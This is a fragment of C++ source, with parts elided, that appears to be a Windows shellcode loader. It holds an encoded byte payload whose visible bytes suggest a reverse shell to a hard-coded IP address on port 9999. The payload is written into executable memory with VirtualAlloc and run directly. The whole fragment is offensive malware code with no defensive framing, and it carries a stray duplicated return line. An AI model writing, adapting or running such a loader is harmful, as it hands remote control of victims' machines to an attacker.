...
"\x89\xe5\x49\xbc\x02\x00\x27\x0f\x89\xb8\xe7\x70\x41\x54"
...
"\x2a\x0a\x41\x89\xda\xff\xd5";
    void* execMem = VirtualAlloc(nullptr, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(execMem, buf, sizeof(buf));
    auto shellcodeFunc = reinterpret_cast<void(*)()>(execMem);
    shellcodeFunc();
    VirtualFree(execMem, 0, MEM_RELEASE);return 0;
    return 0;
}
